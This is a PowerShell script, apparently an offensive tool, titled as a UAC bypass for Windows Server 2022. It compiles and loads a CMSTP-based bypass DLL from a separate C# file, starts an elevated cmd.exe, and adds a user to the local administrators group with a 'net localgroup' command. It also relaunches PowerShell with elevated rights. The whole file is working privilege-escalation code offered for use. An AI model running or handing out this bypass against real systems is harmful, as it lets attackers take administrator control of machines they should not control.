#!-.ps1 
#
# Author : P.Hoogeveem
# Aka    : x0xr00t
# Build  : 20210809
# Name   : UAC Bypass Win Server 2022
# Impact : Privesc 
# 
# Usage  : run the .ps1 file. 


# Naking the dll
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"

# Using the Dll
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))

# Start elevated cmd
[CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
# Add user to group
net localgroup administrators {userhere} /add
# Powershell Elevated 
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
{
  # Relaunch as an elevated process:
  Start-Process powershell.exe "-File",('"{0}"' -f $MyInvocation.MyCommand.Path) -Verb RunAs
  exit
}

